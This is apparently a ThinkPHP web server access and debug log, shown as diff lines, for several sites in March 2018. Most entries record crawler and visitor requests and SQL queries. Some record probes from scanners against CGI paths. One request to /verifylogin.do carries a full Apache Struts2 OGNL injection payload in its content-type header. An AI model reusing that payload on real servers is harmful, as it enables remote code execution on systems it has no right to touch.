+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'picture',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Picture->index[ /home/www/WWW/application/index/controller/Picture.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/picture/index.html [ array (
+  0 => 'picture',
+  1 => 'first_selected',
+  2 => 'second_selected',
+  3 => 'first',
+  4 => 'second',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000270s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000526s ]
+[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0 ORDER BY id asc LIMIT 15 [ RunTime:0.000184s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T08:13:17+08:00 ] 172.16.0.5 178.154.171.74 GET /
+[ log ] zard-forever.com/ [运行时间：0.014422s][吞吐率：69.34req/s] [内存消耗：1,679.43kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-language' => 'ru, uk;q=0.8, be;q=0.8, en;q=0.7, *;q=0.01',
+  'accept-encoding' => 'gzip,deflate',
+  'from' => 'support@search.yandex.ru',
+  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
+  'connection' => 'Keep-Alive',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T08:13:18+08:00 ] 172.16.0.5 178.154.171.14 GET /
+[ log ] www.joy-tee.com/ [运行时间：0.014751s][吞吐率：67.79req/s] [内存消耗：1,679.41kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-language' => 'ru, uk;q=0.8, be;q=0.8, en;q=0.7, *;q=0.01',
+  'accept-encoding' => 'gzip,deflate',
+  'from' => 'support@search.yandex.ru',
+  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.joy-tee.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T08:48:34+08:00 ] 172.16.0.5 183.57.53.177 GET /cgi/common.cgi
+[ log ] 123.207.34.110/cgi/common.cgi [运行时间：0.011901s][吞吐率：84.03req/s] [内存消耗：1,356.81kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi',
+    1 => 'common.cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T09:24:46+08:00 ] 172.16.0.5 59.110.6.177 GET /
+[ log ] 58.87.77.179:80/ [运行时间：0.013999s][吞吐率：71.43req/s] [内存消耗：1,677.85kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'Close',
+  'host' => '58.87.77.179:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T09:35:27+08:00 ] 172.16.0.5 163.177.90.152 GET /
+[ log ] 123.207.34.110/ [运行时间：0.016176s][吞吐率：61.82req/s] [内存消耗：1,679.08kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T10:41:17+08:00 ] 172.16.0.5 207.46.13.17 GET /
+[ log ] zard-forever.com/ [运行时间：0.014314s][吞吐率：69.86req/s] [内存消耗：1,680.79kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'zard-forever.com',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T10:53:01+08:00 ] 172.16.0.5 60.191.38.77 GET /
+[ log ] 123.207.34.110:80/ [运行时间：0.015963s][吞吐率：62.64req/s] [内存消耗：1,678.49kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '123.207.34.110:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T11:03:05+08:00 ] 172.16.0.5 71.6.202.198 GET /ccvv
+[ log ] 123.207.34.110/ccvv [运行时间：0.012139s][吞吐率：82.38req/s] [内存消耗：1,355.63kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ccvv',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T11:24:01+08:00 ] 172.16.0.5 209.126.136.4 GET /
+[ log ] 123.207.34.110/ [运行时间：0.016409s][吞吐率：60.94req/s] [内存消耗：1,678.38kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T11:37:52+08:00 ] 172.16.0.5 207.46.13.17 GET /
+[ log ] www.zard-forever.com/ [运行时间：0.014257s][吞吐率：70.14req/s] [内存消耗：1,680.79kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'www.zard-forever.com',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T11:46:12+08:00 ] 172.16.0.5 183.136.190.42 GET /
+[ log ] www.00it.cn/ [运行时间：0.015231s][吞吐率：65.66req/s] [内存消耗：1,678.45kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T12:58:25+08:00 ] 172.16.0.5 183.136.190.51 GET /index/index/friendly_link.html
+[ log ] www.00it.cn/index/index/friendly_link.html [运行时间：0.028567s][吞吐率：35.01req/s] [内存消耗：1,666.20kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'friendly_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->friendly_link[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/friendly_link.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T13:00:36+08:00 ] 172.16.0.5 183.136.190.51 GET /index/index/suggestion.html
+[ log ] www.00it.cn/index/index/suggestion.html [运行时间：0.033455s][吞吐率：29.89req/s] [内存消耗：1,665.14kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'suggestion',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->suggestion[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/suggestion.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T13:07:26+08:00 ] 172.16.0.5 183.136.190.55 GET /index/mv/index.html
+[ log ] www.00it.cn/index/mv/index.html [运行时间：0.023397s][吞吐率：42.74req/s] [内存消耗：2,682.41kb] [文件加载：58]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'mv',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
+  0 => 'nickname',
+  1 => 'value',
+  2 => 'data',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000256s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000596s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 LIMIT 1 [ RunTime:0.000146s ]
+[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000152s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T13:17:22+08:00 ] 172.16.0.5 60.191.38.77 GET /
+[ log ] 123.207.34.110:80/ [运行时间：0.014412s][吞吐率：69.39req/s] [内存消耗：1,678.49kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '123.207.34.110:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:00:12+08:00 ] 172.16.0.5 14.17.3.65 GET /
+[ log ] 123.207.34.110/ [运行时间：0.016623s][吞吐率：60.16req/s] [内存消耗：1,679.08kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:13:51+08:00 ] 172.16.0.5 112.90.82.218 GET /
+[ log ] 123.207.34.110/ [运行时间：0.021711s][吞吐率：46.06req/s] [内存消耗：1,679.08kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:13:51+08:00 ] 172.16.0.5 14.17.3.65 GET /ccvv
+[ log ] 123.207.34.110/ccvv [运行时间：0.015593s][吞吐率：64.13req/s] [内存消耗：1,356.69kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ccvv',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:28:08+08:00 ] 172.16.0.5 112.226.76.255 GET /verifylogin.do
+[ log ] 123.207.34.110/verifylogin.do [运行时间：0.011568s][吞吐率：86.44req/s] [内存消耗：1,362.70kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'verifylogin.do',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.207.34.110',
+  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gbk, GB2312',
+  'accept' => 'text/html, application/xhtml+xml, */*',
+  'content-type' => '%{(#test=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(55*55+1)).(#ros.flush())}',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:06+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php
+[ log ] 123.207.34.110/cgi-bin/php [运行时间：0.011826s][吞吐率：84.56req/s] [内存消耗：1,355.30kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:07+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php5
+[ log ] 123.207.34.110/cgi-bin/php5 [运行时间：0.011866s][吞吐率：84.28req/s] [内存消耗：1,355.30kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php5',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:07+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php-cgi
+[ log ] 123.207.34.110/cgi-bin/php-cgi [运行时间：0.012458s][吞吐率：80.27req/s] [内存消耗：1,355.34kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php-cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:08+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php.cgi
+[ log ] 123.207.34.110/cgi-bin/php.cgi [运行时间：0.012682s][吞吐率：78.85req/s] [内存消耗：1,355.34kb] [文件加载：40]
